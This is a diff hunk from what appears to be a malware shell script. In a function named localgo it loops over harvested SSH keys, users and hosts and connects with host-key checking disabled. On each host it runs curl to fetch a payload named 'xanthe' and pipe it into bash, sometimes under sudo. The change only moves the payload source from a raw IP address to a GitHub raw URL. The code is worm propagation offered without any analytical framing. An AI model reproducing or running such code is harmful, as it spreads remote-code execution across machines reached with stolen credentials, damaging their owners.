@@ -565,8 +565,8 @@ localgo() {
 					chmod +r $key
 					chmod 400 $key
 					echo "$user@$host"
-					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "sudo curl -A hostcheck/1.5 -L http://34.92.166.158:8080/files/xanthe | sudo bash -s;"
-					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "curl -A hostcheck/1.5 -L http://34.92.166.158:8080/files/xanthe | bash -s;"
+					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "sudo curl -A hostcheck/1.5 -L https://github.com/nandakrr/xanthe/blob/main/xanthe1?raw=true | sudo bash -s;"
+					ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "curl -A hostcheck/1.5 -L https://github.com/nandakrr/xanthe/blob/main/xanthe1?raw=true | bash -s;"
 				done
 			done
 		done
